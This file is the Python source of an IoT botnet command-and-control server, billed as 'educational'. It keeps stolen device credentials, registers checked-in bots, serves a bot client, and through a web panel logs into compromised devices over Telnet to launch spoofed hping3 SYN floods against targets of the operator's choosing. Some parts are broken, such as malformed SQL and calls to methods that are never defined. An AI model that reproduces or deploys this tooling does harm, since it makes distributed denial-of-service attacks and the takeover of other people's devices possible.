#!/usr/bin/env python3
"""
IoT Security Research - Command & Control Server
Educational Purpose Only - For Controlled Lab Environment
"""

from flask import Flask, request, jsonify, send_file, render_template_string
import sqlite3
import threading
import time
from datetime import datetime
import logging
from werkzeug.serving import make_server
import json
import telnetlib
import subprocess
import requests
import os
import argparse
import platform

app = Flask(__name__)

# Configure logging for research purposes
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('cnc_research.log'),
        logging.StreamHandler()
    ]
)

# Database initialization
def init_database():
    conn = sqlite3.connect('research_db.sqlite')
    cursor = conn.cursor()
    
    # Table for compromised devices
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT UNIQUE,
            username TEXT,
            password TEXT,
            status TEXT DEFAULT 'offline',
            last_seen TIMESTAMP,
            infection_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Table for commands
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command TEXT,
            target_ip TEXT,
            attack_type TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'pending',
            bot_ip TEXT
        )
    ''')
    
    # Table for attack logs (scan results)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attack_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            port INTEGER,
            service TEXT,
            credentials TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            attack_type TEXT,
            target TEXT,
            start_time TIMESTAMP,
            participating_bots INTEGER,
            status TEXT
        )
    ''')
    
    conn.commit()
    conn.close()
    logging.info("Database initialized successfully")

class DatabaseManager:
    def __init__(self):
        self.db_lock = threading.Lock()
    
    def get_connection(self):
        return sqlite3.connect('research_db.sqlite')
    
    def register_device(self, ip, username, password):
        """Register a compromised device"""
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            try:
                cursor.execute('''
                    INSERT OR REPLACE INTO devices (ip, username, password, status, last_seen)
                    VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)
                ''', (ip, username, password))
                conn.commit()
                logging.info(f"Device registered: {ip} ({username})")
                return True
            except Exception as e:
                logging.error(f"Failed to register device {ip}: {e}")
                return False
            finally:
                conn.close()
    
    def update_device_status(self, ip, status):
        """Update device status"""
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE devices SET status = ?, last_seen = CURRENT_TIMESTAMP WHERE ip = ?
            ''', (status, ip))
            conn.commit()
            conn.close()
    
    def get_all_devices(self):
        """Get all devices from database"""
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM devices')
        devices = cursor.fetchall()
        conn.close()
        return devices
    
    def get_online_devices(self):
        """Get only online devices"""
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM devices WHERE status = "online"')
        devices = cursor.fetchall()
        conn.close()
        return devices
    
    def log_attack(self, attack_type, target, participating_bots):
        """Log attack information"""
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO attack_logs (attack_type, target, start_time, participating_bots, status)
                VALUES (?, ?, CURRENT_TIMESTAMP, ?, 'active')
            ''', (attack_type, target, participating_bots))
            attack_id = cursor.lastrowid
            conn.commit()
            conn.close()
            return attack_id

    def execute_telnet_login_and_send(self, ip, username, password, command):
        """Establish Telnet connection, login, send command, and verify execution"""
        tn = None
        try:
            logging.info(f"Attempting Telnet connection to {ip}:23")
            tn = telnetlib.Telnet(ip, 23, timeout=25)
            logging.info(f"Telnet connection to {ip} established")

            # Handle login prompt
            login_patterns = [b"login: ", b"Username: ", b"Login: "]
            try:
                index, match, response = tn.expect(login_patterns, timeout=15)
                response_text = response.decode(errors='ignore')
                logging.info(f"Login response from {ip}: {response_text}")
                
                if not match:
                    logging.error(f"✗ No login prompt detected on {ip}")
                    tn.close()
                    return None
            except Exception as e:
                logging.error(f"✗ Timeout or error waiting for login prompt on {ip}: {e}")
                tn.close()
                return None

            # Send username
            tn.write(username.encode() + b"\n")
            logging.info(f"Sent username '{username}' to {ip}")

            # Handle password prompt
            password_patterns = [b"Password: ", b"password: ", b"Password:", b"password:"]
            try:
                index, match, response = tn.expect(password_patterns, timeout=10)
                response_text = response.decode(errors='ignore')
                logging.info(f"Password prompt response from {ip}: {response_text}")
                
                if not match:
                    logging.error(f"✗ No password prompt detected on {ip}")
                    tn.close()
                    return None
            except Exception as e:
                logging.error(f"✗ Timeout or error waiting for password prompt on {ip}: {e}")
                tn.close()
                return None

            # Send password
            tn.write((password or "").encode() + b"\n")
            logging.info(f"Sent password to {ip}")

            # Wait for shell prompt after login
            shell_patterns = [b"$ ", b"# ", b"> ", b"$", b"#", b">"]
            try:
                index, match, response = tn.expect(shell_patterns, timeout=15)
                response_text = response.decode(errors='ignore')
                logging.info(f"Shell prompt response from {ip}: {response_text}")
                
                # Check for login failure messages
                if any(msg in response_text.lower() for msg in ['login incorrect', 'access denied', 'authentication failed']):
                    logging.error(f"✗ Login failed for {ip} - authentication rejected")
                    tn.close()
                    return None
                    
                if not match:
                    logging.error(f"✗ No shell prompt detected on {ip} after login")
                    tn.close()
                    return None
            except Exception as e:
                logging.error(f"✗ Timeout or error waiting for shell prompt on {ip}: {e}")
                tn.close()
                return None

            logging.info(f"✓ Successfully logged into {ip}, sending command: {command}")
            
            # Send the sudo hping3 command
            tn.write(command.encode() + b"\n")
            time.sleep(2)

            # Check for sudo password prompt and hping3 execution
            sudo_patterns = [
                b"[sudo] password for",
                b"Password:",
                b"password:",
                b"Enter password:"
            ]
            
            hping_patterns = [
                b"HPING",
                b"hping",
                b"--- hping statistic ---",
                b"flood mode"
            ]
            
            error_patterns = [
                b"command not found",
                b"Permission denied",
                b"sudo: command not found",
                b"hping3: command not found",
                b"No such file or directory"
            ]
            
            all_patterns = sudo_patterns + hping_patterns + error_patterns + shell_patterns
            
            try:
                index, match, response = tn.expect(all_patterns, timeout=20)
                response_text = response.decode(errors='ignore')
                logging.info(f"Command response from {ip}: {response_text}")

                if match:
                    matched_pattern = match.group(0)
                    
                    # Check for errors first
                    if any(pattern in matched_pattern for pattern in error_patterns):
                        logging.error(f"✗ Command failed on {ip}: {response_text}")
                        tn.close()
                        return None
                    
                    # Check if it's a sudo password prompt
                    elif any(pattern in matched_pattern for pattern in sudo_patterns):
                        logging.info(f"Sudo password prompt detected on {ip}, sending password")
                        tn.write(password.encode() + b"\n")
                        time.sleep(3)
                        
                        # After sending sudo password, check for hping3 execution
                        post_sudo_patterns = hping_patterns + error_patterns + shell_patterns
                        try:
                            index2, match2, response2 = tn.expect(post_sudo_patterns, timeout=15)
                            response2_text = response2.decode(errors='ignore')
                            logging.info(f"Post-sudo response from {ip}: {response2_text}")
                            
                            if match2:
                                matched_pattern2 = match2.group(0)
                                
                                if any(pattern in matched_pattern2 for pattern in error_patterns):
                                    logging.error(f"✗ Hping3 command failed on {ip}: {response2_text}")
                                    tn.close()
                                    return None
                                elif any(pattern in matched_pattern2 for pattern in hping_patterns):
                                    logging.info(f"✓ Hping3 successfully started on {ip}")
                                    time.sleep(2)
                                    return tn
                                else:
                                    logging.warning(f"? Unknown response after sudo on {ip}: {response2_text}")
                                    return tn
                        except Exception as e:
                            logging.error(f"✗ Error after sudo password on {ip}: {e}")
                            tn.close()
                            return None
                    
                    # Check if hping3 started directly
                    elif any(pattern in matched_pattern for pattern in hping_patterns):
                        logging.info(f"✓ Hping3 started directly on {ip} (no sudo required)")
                        time.sleep(2)
                        return tn
                    
                    else:
                        logging.warning(f"? Shell prompt returned immediately on {ip}")
                        return tn
                else:
                    logging.warning(f"? No expected pattern matched on {ip}")
                    return tn
                    
            except Exception as e:
                logging.error(f"✗ Error executing command on {ip}: {e}")
                tn.close()
                return None

        except Exception as e:
            logging.error(f"✗ Telnet execution failed for {ip}: {e}")
            if tn:
                try:
                    tn.close()
                except:
                    pass
            return None

# Global variables
db_manager = DatabaseManager()
active_telnet_sessions = {} # Dictionary to hold active Telnet session objects {ip: tn_object}
current_attack = None
attack_status = {
    'active': False,
    'type': None,
    'target': None,
    'start_time': None,
    'participating_bots': 0
}

# Initialize database on startup
init_database()

# HTML template for web interface
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>IoT C2 Research Panel</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0; 
            padding: 20px; 
            background-color: #f5f5f5; 
        }
        .container { 
            max-width: 1400px; 
            margin: 0 auto; 
            background: white; 
            border-radius: 8px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
            overflow: hidden;
        }
        .header { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: white; 
            padding: 20px; 
            text-align: center; 
        }
        .header h1 { margin: 0; font-size: 24px; }
        .stats { 
            display: flex; 
            background: #f8f9fa; 
            border-bottom: 1px solid #dee2e6; 
        }
        .stat-box { 
            flex: 1; 
            padding: 15px; 
            text-align: center; 
            border-right: 1px solid #dee2e6; 
        }
        .stat-box:last-child { border-right: none; }
        .stat-number { font-size: 24px; font-weight: bold; color: #495057; }
        .stat-label { font-size: 12px; color: #6c757d; text-transform: uppercase; }
        .section { 
            margin: 20px; 
            background: white; 
            border-radius: 6px; 
            overflow: hidden; 
            border: 1px solid #dee2e6;
        }
        .section-header { 
            background: #f8f9fa; 
            padding: 12px 16px; 
            border-bottom: 1px solid #dee2e6; 
            font-weight: 600; 
            font-size: 16px; 
        }
        table { 
            width: 100%; 
            border-collapse: collapse; 
        }
        th, td { 
            padding: 12px 16px; 
            text-align: left; 
            border-bottom: 1px solid #f1f3f4; 
        }
        th { 
            background-color: #f8f9fa; 
            font-weight: 600; 
            font-size: 14px; 
            color: #495057; 
        }
        td { font-size: 14px; }
        .status-online { 
            background: #d4edda; 
            color: #155724; 
            padding: 4px 8px; 
            border-radius: 12px; 
            font-size: 12px; 
            font-weight: 500; 
        }
        .btn { 
            padding: 6px 12px; 
            margin: 2px; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            font-size: 12px; 
            font-weight: 500; 
            transition: all 0.2s; 
        }
        .btn-attack { background: #dc3545; color: white; }
        .btn-attack:hover { background: #c82333; }
        .btn-stop { background: #6c757d; color: white; }
        .btn-stop:hover { background: #5a6268; }
        .btn-bulk { 
            background: #007bff; 
            color: white; 
            padding: 10px 20px; 
            margin: 10px; 
            font-size: 14px; 
        }
        .btn-bulk:hover { background: #0056b3; }
        .ip-address { font-family: 'Courier New', monospace; color: #495057; }
        .credentials { font-family: 'Courier New', monospace; font-size: 12px; color: #6c757d; }
        .empty-state { 
            text-align: center; 
            padding: 40px; 
            color: #6c757d; 
        }
        .bulk-actions { 
            background: #f8f9fa; 
            padding: 15px; 
            border-bottom: 1px solid #dee2e6; 
            text-align: center; 
        }
        tr:hover { background-color: #f8f9fa; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>IoT Security Research - C2 Panel</h1>
            <p style="margin: 5px 0 0 0; opacity: 0.9;">Educational Lab Environment</p>
        </div>

        <div class="stats">
            <div class="stat-box">
                <div class="stat-number">{{ bots|length }}</div>
                <div class="stat-label">Compromised Devices</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{{ scan_results|length }}</div>
                <div class="stat-label">Discovered Targets</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{{ active_sessions }}</div>
                <div class="stat-label">Active Sessions</div>
            </div>
        </div>

        <div class="section">
            <div class="section-header">Compromised Devices</div>
            {% if bots %}
            <div class="bulk-actions">
                <button class="btn btn-bulk" onclick="startBulkAttack()">Start Bulk Attack</button>
                <button class="btn btn-bulk btn-stop" onclick="stopAllAttacks()">Stop All Attacks</button>
            </div>
            <table>
                <thead>
                    <tr>
                        <th>IP Address</th>
                        <th>Credentials</th>
                        <th>Status</th>
                        <th>Last Seen</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    {% for bot in bots %}
                    <tr>
                        <td class="ip-address">{{ bot.ip }}</td>
                        <td class="credentials">{{ bot.username }}:{{ bot.password }}</td>
                        <td><span class="status-online">{{ bot.status }}</span></td>
                        <td>{{ bot.last_seen }}</td>
                        <td>
                            <button class="btn btn-attack" onclick="startAttack('{{ bot.ip }}')">Attack</button>
                            <button class="btn btn-stop" onclick="stopAttack('{{ bot.ip }}')">Stop</button>
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
            {% else %}
            <div class="empty-state">
                <p>No compromised devices available</p>
                <p style="font-size: 12px;">Run the exploit script to discover and compromise devices</p>
            </div>
            {% endif %}
        </div>

        {% if scan_results %}
        <div class="section">
            <div class="section-header">Discovered Targets</div>
            <table>
                <thead>
                    <tr>
                        <th>IP Address</th>
                        <th>Port</th>
                        <th>Service</th>
                        <th>Discovered</th>
                    </tr>
                </thead>
                <tbody>
                    {% for result in scan_results %}
                    <tr>
                        <td class="ip-address">{{ result.ip }}</td>
                        <td>{{ result.port }}</td>
                        <td>{{ result.service }}</td>
                        <td>{{ result.timestamp }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        {% endif %}
    </div>

    <script>
        function startAttack(botIp) {
            const target = prompt('Enter target IP address:');
            if (!target) return;
            
            const attackType = prompt('Attack type:\nsyn - HTTP flood (port 80)\nrtsp - RTSP flood (port 554)\nmqtt - MQTT flood (port 1883)\n\nEnter type:');
            if (!attackType || !['syn', 'rtsp', 'mqtt'].includes(attackType.toLowerCase())) {
                alert('Invalid attack type. Use: syn, rtsp, or mqtt');
                return;
            }
            
            fetch('/start-attack', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    bot_ip: botIp,
                    target: target,
                    attack_type: attackType.toLowerCase()
                })
            }).then(response => response.json())
              .then(data => {
                  if (data.status === 'success') {
                      alert('✓ Attack started successfully');
                  } else {
                      alert('✗ Failed to start attack: ' + data.error);
                  }
              })
              .catch(err => alert('Error: ' + err));
        }

        function stopAttack(botIp) {
            if (!confirm('Stop attack on ' + botIp + '?')) return;
            
            fetch('/stop-attack', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({bot_ip: botIp})
            }).then(response => response.json())
              .then(data => alert(data.message))
              .catch(err => alert('Error: ' + err));
        }

        function startBulkAttack() {
            const target = prompt('Enter target IP for bulk attack:');
            if (!target) return;
            
            const attackType = prompt('Attack type (syn/rtsp/mqtt):');
            if (!attackType || !['syn', 'rtsp', 'mqtt'].includes(attackType.toLowerCase())) {
                alert('Invalid attack type');
                return;
            }
            
            if (!confirm(`Start ${attackType.toUpperCase()} attack on ALL devices against ${target}?`)) return;
            
            fetch('/start-telnet-ddos', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    target: target,
                    attack_type: attackType.toLowerCase()
                })
            }).then(response => response.json())
              .then(data => {
                  if (data.status === 'success') {
                      alert(`✓ ${data.message}`);
                      setTimeout(() => location.reload(), 2000);
                  } else {
                      alert(`✗ ${data.message}`);
                  }
              })
              .catch(err => alert('Error: ' + err));
        }

        function stopAllAttacks() {
            if (!confirm('Stop all active attacks?')) return;
            
            fetch('/stop-telnet-ddos', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'}
            }).then(response => response.json())
              .then(data => {
                  alert(data.message);
                  setTimeout(() => location.reload(), 1000);
              })
              .catch(err => alert('Error: ' + err));
        }

        // Auto-refresh every 30 seconds
        setInterval(() => location.reload(), 30000);
    </script>
</body>
</html>
'''

class C2Server:
    def __init__(self, host='0.0.0.0', port=5000):
        self.host = host
        self.port = port
        self.bots = {}
        self.commands = {}
        self.scan_results = []
        self.server = None
        init_database()
        
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"[C2 Server] {message}")
    
    def start(self):
        """Start the C2 server"""
        self.log(f"Starting C2 server on {self.host}:{self.port}")
        self.server = make_server(self.host, self.port, app)
        self.server.serve_forever()
    
    def stop(self):
        """Stop the C2 server"""
        if self.server:
            self.server.shutdown()
            self.log("C2 server stopped")

# Flask routes
@app.route('/')
def index():
    """Web interface for C2 server"""
    global active_telnet_sessions
    
    conn = sqlite3.connect('research_db.sqlite')
    cursor = conn.cursor()
    
    # Get active bots - Include username and password
    cursor.execute('SELECT ip, username, password, status, last_seen FROM devices WHERE status = "online" ORDER BY last_seen DESC')
    bots = [{'ip': row[0], 'username': row[1], 'password': row[2], 'status': row[3], 'last_seen': row[4]} for row in cursor.fetchall()]
    
    # Get only the latest scan result for each unique IP
    cursor.execute('''
        SELECT ip, port, service, MAX(timestamp) as timestamp
        FROM attack_logs
        WHERE port IS NOT NULL
        GROUP BY ip
        ORDER BY timestamp DESC
        LIMIT 10
    ''')
    scan_results = [{'ip': row[0], 'port': row[1], 'service': row[2], 'timestamp': row[3]} for row in cursor.fetchall()]
    
    conn.close()
    
    # Count active telnet sessions
    active_sessions_count = len(active_telnet_sessions)
    
    return render_template_string(HTML_TEMPLATE, 
                                bots=bots, 
                                scan_results=scan_results, 
                                active_sessions=active_sessions_count)

@app.route('/bot-checkin', methods=['POST'])
def bot_checkin():
    """Handle bot check-in and device registration"""
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No data provided'}), 400
            
        bot_ip = data.get('ip')
        username = data.get('username')
        password = data.get('password')
        status = data.get('status', 'online')

        if not bot_ip:
            return jsonify({'error': 'Missing bot IP'}), 400

        # Register device with credentials
        success = db_manager.register_device(bot_ip, username, password)
        
        if success:
            return jsonify({'status': 'success', 'message': 'Device registered successfully'})
        else:
            return jsonify({'error': 'Failed to register device'}), 500

    except Exception as e:
        logging.error(f"Error in bot check-in: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/get-command/<bot_ip>', methods=['GET'])
def get_command(bot_ip):
    """Get the latest command for a bot"""
    try:
        with db_manager.db_lock:
            conn = db_manager.get_connection()
            cursor = conn.cursor()
            
            # Get the latest pending command for this specific bot
            cursor.execute('''
                SELECT id, command, target_ip, attack_type
                FROM commands
                WHERE (bot_ip = ? OR bot_ip IS NULL)
                AND status = 'pending'
                ORDER BY id DESC
                LIMIT 1
            ''', (bot_ip,))
            
            command = cursor.fetchone()
            
            if command:
                command_id, command_data, target_ip, attack_type = command
                
                # Update command status to 'executing'
                cursor.execute('''
                    UPDATE commands
                    SET status = 'executing'
                    WHERE id = ?
                ''', (command_id,))
                
                conn.commit()
                conn.close()
                
                return jsonify({
                    'command_id': command_id,
                    'command': json.loads(command_data),
                    'target_ip': target_ip,
                    'attack_type': attack_type
                })
            
            conn.close()
            return jsonify({'status': 'no_command'})
            
    except Exception as e:
        logging.error(f"Failed to get command for bot {bot_ip}: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/start-attack', methods=['POST'])
def start_attack():
    """Start a DDoS attack by translating the request into hping3 commands"""
    try:
        data = request.get_json()
        target = data.get('target')
        attack_type = data.get('attack_type', 'syn')
        bot_ip = data.get('bot_ip')  # Get the specific bot IP
        
        if not target:
            return jsonify({'error': 'Target IP required'}), 400
            
        # Translate attack request into hping3 command
        if attack_type == 'syn':
            command = {
                'type': 'ddos',
                'tool': 'hping3',
                'args': [
                    '-S',              # SYN flood
                    '-p', '80',        # Target port
                    '--flood',         # Flood mode
                    '--rand-source',   # Random source IPs
                    target
                ]
            }
        elif attack_type == 'rtsp':
            command = {
                'type': 'ddos',
                'tool': 'hping3',
                'args': [
                    '-S',              # SYN flood
                    '-p', '554',       # RTSP port
                    '--flood',         # Flood mode
                    '--rand-source',   # Random source IPs
                    target
                ]
            }
        elif attack_type == 'mqtt':
            command = {
                'type': 'ddos',
                'tool': 'hping3',
                'args': [
                    '-S',              # SYN flood
                    '-p', '1883',      # MQTT port
                    '--flood',         # Flood mode
                    '--rand-source',   # Random source IPs
                    target
                ]
            }
        else:
            return jsonify({'error': 'Invalid attack type'}), 400
            
        # Store command in database
        with db_manager.db_lock:
            conn = db_manager.get_connection()
            cursor = conn.cursor()
            
            # If bot_ip is specified, create command for that specific bot
            if bot_ip:
                cursor.execute('''
                    INSERT INTO commands (command, target_ip, attack_type, status, bot_ip)
                    VALUES (?, ?, ?, 'pending', ?)
                    ON CONFLICT(bot_ip) DO UPDATE SET
                    command=excluded.command,
                    target_ip=excluded.target_ip,
                    attack_type=excluded.attack_type,
                    status='pending'
                ''', (json.dumps(command), target, attack_type, bot_ip))
            else:
                # Create command for all online bots
                cursor.execute('''
                    INSERT INTO commands (command, target_ip, attack_type, status)
                    VALUES (?, ?, ?, 'pending')
                    VALUES (?, ?, ?, 'pending')
                ''', (json.dumps(command), target, attack_type))
            
            command_id = cursor.lastrowid
            conn.commit()
            conn.close()
            
        logging.info(f"Attack command created: {command} against {target}")
        return jsonify({'status': 'success', 'command_id': command_id})
        
    except Exception as e:
        logging.error(f"Failed to start attack: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/stop-attack', methods=['POST'])
def stop_attack():
    """Stop DDoS attack"""
    try:
        data = request.json
        bot_ip = data.get('bot_ip')
        
        if not bot_ip:
            return jsonify({'error': 'Missing bot IP'}), 400
        
        # Add stop command to database
        conn = sqlite3.connect('research_db.sqlite')
        cursor = conn.cursor()
        cursor.execute('''INSERT INTO commands 
                    (command, target_ip, status, timestamp)
                    VALUES (?, ?, ?, datetime('now'))''',
                 (f"stop_ddos {bot_ip}", bot_ip, 'pending'))
        conn.commit()
        conn.close()
        
        return jsonify({'message': f'Stop command sent to {bot_ip}'})
        
    except Exception as e:
        logging.error(f"Error stopping attack: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/add-scan-result', methods=['POST'])
def add_scan_result():
    """Add scan result to database"""
    try:
        data = request.json
        required_fields = ['ip', 'port', 'service']
        
        if not all(field in data for field in required_fields):
            return jsonify({'error': 'Missing required fields'}), 400
        
        conn = sqlite3.connect('research_db.sqlite')
        cursor = conn.cursor()
        cursor.execute('''INSERT INTO attack_logs 
                    (ip, port, service, credentials, timestamp)
                    VALUES (?, ?, ?, ?, datetime('now'))''',
                 (data['ip'], data['port'], data['service'], 
                  data.get('credentials', '')))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Error adding scan result: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/download-bot', methods=['GET'])
def download_bot():
    """Serve bot client script"""
    try:
        return send_file('bot_client.py',
                        mimetype='text/plain',
                        as_attachment=True,
                        download_name='bot_client.py')
    except Exception as e:
        logging.error(f"Error serving bot client: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/get-scan-results', methods=['GET'])
def get_scan_results():
    conn = sqlite3.connect('research_db.sqlite')
    cursor = conn.cursor()
    cursor.execute('''
        SELECT ip, port, service, credentials, MAX(timestamp) as timestamp
        FROM attack_logs
        GROUP BY ip
        ORDER BY timestamp DESC
    ''')
    results = [{'ip': row[0], 'port': row[1], 'service': row[2], 'credentials': row[3], 'timestamp': row[4]} for row in cursor.fetchall()]
    conn.close()
    return jsonify(results)

@app.route('/get-compromised-devices', methods=['GET'])
def get_compromised_devices():
    """Get all compromised devices from the database."""
    try:
        conn = sqlite3.connect('research_db.sqlite')
        cursor = conn.cursor()
        cursor.execute('SELECT ip, username, password, status, last_seen FROM devices')
        devices = [{'ip': row[0], 'username': row[1], 'password': row[2], 'status': row[3], 'timestamp': row[4]} for row in cursor.fetchall()]
        conn.close()
        logging.info(f"Fetched {len(devices)} compromised devices from database.")
        return jsonify(devices)
    except Exception as e:
        logging.error(f"Error fetching compromised devices: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/start-telnet-ddos', methods=['POST'])
def start_telnet_ddos():
    """Start DDoS attack on all compromised devices via Telnet."""
    global active_telnet_sessions
    try:
        data = request.get_json()
        target_ip = data.get('target')
        attack_type = data.get('attack_type', 'syn')

        if not target_ip:
            logging.error("Target IP missing in request")
            return jsonify({'error': 'Target IP required'}), 400

        # Get all compromised devices from the database
        conn = db_manager.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT ip, username, password FROM devices WHERE status = "online"')
        devices = cursor.fetchall()
        conn.close()

        if not devices:
            logging.error("No online devices found in database")
            return jsonify({
                'status': 'error',
                'message': 'No online devices available for attack',
                'successful_ips': []
            }), 400

        logging.info(f"Retrieved {len(devices)} devices from database for Telnet DDoS.")
        successful_sessions = []
        failed_sessions = []

        # Build hping3 command
        if attack_type == 'syn':
            hping3_cmd = f"sudo hping3 -S -p 80 --flood --rand-source {target_ip}"
        elif attack_type == 'rtsp':
            hping3_cmd = f"sudo hping3 -S -p 554 --flood --rand-source {target_ip}"
        elif attack_type == 'mqtt':
            hping3_cmd = f"sudo hping3 -S -p 1883 --flood --rand-source {target_ip}"
        else:
            return jsonify({'error': 'Invalid attack type'}), 400

        # Clear previous sessions
        active_telnet_sessions.clear()
        logging.info("Cleared previous active Telnet sessions.")

        for device in devices:
            ip, username, password = device
            logging.info(f"Attempting attack on {ip} with credentials {username}:{password}")
            
            tn = db_manager.execute_telnet_login_and_send(ip, username, password, hping3_cmd)

            if tn:
                active_telnet_sessions[ip] = tn
                successful_sessions.append(ip)
                logging.info(f"✓ Successfully started attack on {ip}")
            else:
                failed_sessions.append(ip)
                logging.error(f"✗ Failed to start attack on {ip}")

        if successful_sessions:
            return jsonify({
                'status': 'success',
                'message': f'Successfully started {attack_type.upper()} attack on {len(successful_sessions)}/{len(devices)} devices against {target_ip}',
                'successful_ips': successful_sessions,
                'failed_ips': failed_sessions
            })
        else:
            return jsonify({
                'status': 'error',
                'message': f'Failed to start attack on any devices (0/{len(devices)})',
                'successful_ips': [],
                'failed_ips': failed_sessions
            }), 500

    except Exception as e:
        logging.error(f"Failed to initiate Telnet DDoS attack: {e}")
        # Clean up any partial sessions
        for ip, tn in list(active_telnet_sessions.items()):
            try:
                tn.close()
                del active_telnet_sessions[ip]
            except:
                pass
        return jsonify({'error': str(e)}), 500

@app.route('/stop-telnet-ddos', methods=['POST'])
def stop_telnet_ddos():
    """Stop DDoS attack on all compromised devices via active Telnet sessions."""
    global active_telnet_sessions
    stopped_count = 0
    errors = {}
    initial_session_count = len(active_telnet_sessions)

    # Iterate through active sessions and stop them
    # Create a list of keys to iterate over as the dictionary will be modified
    ips_to_stop = list(active_telnet_sessions.keys())
    logging.info(f"Attempting to stop {len(ips_to_stop)} active Telnet DDoS sessions.")

    for ip in ips_to_stop:
        tn = active_telnet_sessions.get(ip)
        if tn:
            success = db_manager.stop_telnet_session(ip, tn)
            if success:
                stopped_count += 1
            else:
                errors[ip] = f"Failed to stop session for {ip}"

            # Remove from active sessions regardless of stop success
            if ip in active_telnet_sessions:
                 del active_telnet_sessions[ip]

    response_message = f'Attempted to stop DDoS attack on {stopped_count}/{initial_session_count} devices.'
    if errors:
        response_message += f' Errors on: {list(errors.keys())}'

    return jsonify({
        'status': 'success' if not errors else 'partial_success',
        'message': response_message,
        'errors': errors
    })

@app.route('/check-attack-status', methods=['GET'])
def check_attack_status():
    """Check status of active attacks"""
    try:
        global active_telnet_sessions
        
        active_attacks = []
        for ip, tn in active_telnet_sessions.items():
            try:
                # Try to verify if hping3 is still running
                if db_manager.verify_hping3_running(tn, ip):
                    status = "active"
                else:
                    status = "stopped"
                
                active_attacks.append({
                    'ip': ip,
                    'status': status
                })
            except:
                active_attacks.append({
                    'ip': ip,
                    'status': 'unknown'
                })
        
        return jsonify({
            'total_sessions': len(active_telnet_sessions),
            'attacks': active_attacks
        })
        
    except Exception as e:
        logging.error(f"Error checking attack status: {e}")
        return jsonify({'error': str(e)}), 500

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='IoT C2 Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=5000, help='Port to bind to')
    args = parser.parse_args()
    
    server = C2Server(args.host, args.port)
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()

if __name__ == "__main__":
    main()